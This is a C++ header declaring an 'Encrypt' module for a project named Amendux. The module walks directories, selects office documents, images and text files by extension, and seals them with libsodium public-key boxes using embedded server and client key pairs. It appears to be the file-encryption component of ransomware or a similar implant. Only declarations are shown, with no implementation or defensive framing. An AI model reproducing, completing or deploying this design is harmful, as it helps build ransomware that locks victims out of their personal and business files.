#pragma once

#ifdef MODCRYPT_ENABLED
#include <sodium.h>

namespace Amendux {

	namespace Module {

		class Encrypt //TODO inherit module
		{
		private:
			const char *extensions[10] = { "doc", "docx", "jpg", "png", "xls", "xlsx", "ppt", "pptx", "txt" };

			unsigned char serverPublicKey[crypto_box_PUBLICKEYBYTES];
			unsigned char serverSecretKey[crypto_box_SECRETKEYBYTES];
			unsigned char clientPublicKey[crypto_box_PUBLICKEYBYTES];
			unsigned char clientSecretKey[crypto_box_SECRETKEYBYTES];

			void getDirFiles(std::wstring szDir);
			bool isExtensionMatch(const std::wstring& file);
			bool boxSeal(std::wstring file);
			bool boxUnseal();

		public:
			Encrypt();
			~Encrypt();

			unsigned char *clientPublickey() {
				return clientPublicKey;
			}

			unsigned char *clientPrivatekey() {
				return clientSecretKey;
			}

			void Run();
			void genLocalKeypair();
			void setLocalKeypair(unsigned char *publickey, unsigned char *privatekey);
		};

	}
}
#endif
